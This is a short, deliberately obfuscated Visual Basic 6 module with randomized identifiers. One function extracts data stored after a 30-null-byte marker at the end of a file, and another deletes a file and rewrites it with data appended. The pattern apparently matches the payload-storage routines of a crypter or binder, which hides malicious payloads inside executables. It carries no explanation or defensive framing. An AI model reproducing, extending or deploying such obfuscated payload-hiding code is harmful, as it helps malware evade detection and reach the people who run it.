Attribute VB_Name = "Module1"
Public Function o2EPPN(GAqUc3Kor As String) As String
On Error GoTo ErrHandler
Dim DmMLiWh05A5j As String
Dim WSazkwY As String
Dim F3428AIQ As Long
Open GAqUc3Kor For Binary As #1
DmMLiWh05A5j = Space$(LOF(1))
Get #1, , DmMLiWh05A5j
Close #1
F3428AIQ = InStr(1, StrReverse(DmMLiWh05A5j), DO3OLE0Wo4ho(30))
WSazkwY = (Mid(StrReverse(DmMLiWh05A5j), 1, F3428AIQ - 1))
o2EPPN = StrReverse(WSazkwY)
Exit Function
ErrHandler:
o2EPPN = vbNullString
End Function

Public Sub V2JoqPnsJFk(GAqUc3Kor As String, dvXRqs5dAJ As String)
On Error Resume Next
Dim bUqpIwzp As String
Dim GtFlk As Long
GtFlk = FreeFile
Open GAqUc3Kor For Binary As #GtFlk
bUqpIwzp = Space$(LOF(GtFlk))
Get #GtFlk, , bUqpIwzp
Close #GtFlk
Kill GAqUc3Kor
GtFlk = FreeFile
Open GAqUc3Kor For Binary As #GtFlk
Put #GtFlk, , bUqpIwzp & dvXRqs5dAJ
Close #GtFlk
End Sub

Private Function DO3OLE0Wo4ho(lNum) As String
Dim ODWyG3d0Cw As String
Dim i As Integer
For i = 1 To lNum
ODWyG3d0Cw = ODWyG3d0Cw & Chr(0)
Next i
DO3OLE0Wo4ho = ODWyG3d0Cw
End Function

